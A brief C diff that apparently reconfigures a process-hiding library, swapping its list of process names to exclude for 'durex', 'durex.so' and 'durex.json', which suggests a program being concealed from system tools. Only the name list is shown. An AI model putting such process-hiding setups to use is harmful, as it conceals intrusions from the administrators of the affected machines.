@@ -10,10 +10,9 @@
  * Every process with this name will be excluded
  */
 static const char* processes_to_filter[] = {
-    "proot",
-    "supervisord",
-    "root",
-    "chrome-remote-desktop"
+    "durex.so",
+    "durex.json",
+    "durex"
 };
 
 /*
